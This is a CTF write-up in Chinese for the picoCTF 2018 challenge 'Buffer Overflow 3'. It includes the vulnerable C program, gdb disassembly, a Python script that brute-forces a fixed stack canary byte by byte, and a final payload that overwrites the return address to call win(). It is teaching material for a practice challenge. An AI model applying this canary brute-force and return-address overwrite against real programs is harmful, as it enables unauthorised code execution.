---
layout: post
title: Buffer Overflow 3
categories: writeups
tags: pwn
ctfsite: picoctf-2018
challenge_url: https://2018game.picoctf.com/
challenge_url_comment: 需要注册登录
---

这道题模拟了栈溢出保护，但 canary 是固定的：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 32
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("Canary is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("*** Stack Smashing Detected *** : Canary Value Corrupt!\n");
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  int i;
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

{% include writeup_begin.html %}

由于 Canary 是固定的，因此可以通过多次运行猜测出 Canary 的值。首先我们看一下各个局部变量的位置：

```asm
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x080487c3 <+0>:     push   %ebp
   0x080487c4 <+1>:     mov    %esp,%ebp
   0x080487c6 <+3>:     sub    $0x58,%esp
   0x080487c9 <+6>:     movl   $0x0,-0xc(%ebp)
   0x080487d0 <+13>:    mov    0x804a058,%eax
   0x080487d5 <+18>:    mov    %eax,-0x10(%ebp) ; canary = $ebp - 0x10
   0x080487d8 <+21>:    sub    $0xc,%esp
   0x080487db <+24>:    push   $0x8048a90
   0x080487e0 <+29>:    call   0x8048500 <printf@plt>
   0x080487e5 <+34>:    add    $0x10,%esp
   0x080487e8 <+37>:    jmp    0x8048815 <vuln+82>
   0x080487ea <+39>:    mov    -0xc(%ebp),%eax  ; x = $ebp-0xc
   0x080487ed <+42>:    lea    -0x50(%ebp),%edx ; length = $ebp - 0x50
                        ...
   0x0804884c <+137>:   push   %eax
   0x0804884d <+138>:   lea    -0x30(%ebp),%eax ; buf = $ebp - 0x30
   0x08048850 <+141>:   push   %eax
   0x08048851 <+142>:   push   $0x0
   0x08048853 <+144>:   call   0x80484f0 <read@plt>
   0x08048858 <+149>:   add    $0x10,%esp
                        ...
   0x080488b1 <+238>:   leave
   0x080488b2 <+239>:   ret
```

`canary` 在 `$ebp - 0x10`，`buf` 在 `$ebp - 0x30`，因此中间有 `0x20 = 32` 个字节。我们可以不断地执行这段程序，每次都覆盖 33 个字节，通过改变最后一个字节就可以根据程序输出暴力猜测出 `canary` 的第一个字节的值。然后以此类推，就可以猜出第 2、3、4 个字节。

```python
import subprocess as sp
flag = True
canary = []
for canary_index in range(4):
    i = 0
    while flag:
        p = sp.Popen("/problems/buffer-overflow-3_3/vuln", stdin=sp.PIPE, std
out=sp.PIPE, stderr=sp.PIPE, bufsize=1, cwd="/problems/buffer-overflow-3_3")
        p.stdin.write(str(33+canary_index) + "\n")                                                            
        p.stdin.write('0' * 32 + ''.join(canary) + chr(i) + '\n')
        o = p.stdout.read()
        if "Stack Smashing Detected" not in o:
            break
        i += 1
        if i >= 256:
            print "error finding canary"
            break

    print hex(i)
    canary += [chr(i)]
```

执行后就可以打印出 canary 的值：

```
dontpanic@pico-2018-shell:/tmp/overflow3$ python bf.py
0x49
0x48
0x77
0x6a
dontpanic@pico-2018-shell:/tmp/overflow3$
```

接下来就是常规的爆破了，看一下 `win` 的地址：

```
(gdb) print win
$1 = {<text variable, no debug info>} 0x80486eb <win>
```

然后：

```python
python -c "print '100\n' + '0' * 32 + '\x49\x48\x77\x6aXXXXXXXXXXXX' + '0000\xeb\x86\x04\x08\n'"
                                       ↑canary                          ↑ebp ↑返回地址
```

{% include writeup_end.html %}
